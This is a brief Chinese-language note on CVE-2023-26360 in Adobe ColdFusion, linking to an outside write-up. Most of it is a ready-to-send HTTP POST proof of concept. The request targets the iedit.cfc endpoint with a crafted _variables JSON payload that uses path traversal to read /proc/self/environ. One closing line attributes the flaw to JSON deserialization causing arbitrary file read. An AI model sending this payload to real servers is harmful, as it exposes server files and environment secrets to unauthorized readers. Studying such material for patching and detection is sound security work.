笔记可参考 [cfusion-cve](https://racerz.notion.site/Adobe-ColdFusion-e24c5d1b0853494ba265407595db79a0?pvs=4)

### CVE-2023-26360

- POC

  ```
  POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo HTTP/1.1
  Host: 127.0.0.1:8500
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 86
  
  _variables={"_metadata":{"classname":"../../../../../../../../proc/self/environ"}}
  ```

  主要源于 filter 当中存在 json 反序列化导致任意文件读取，最终模板引擎会将其解析并回显到脚本文件当中

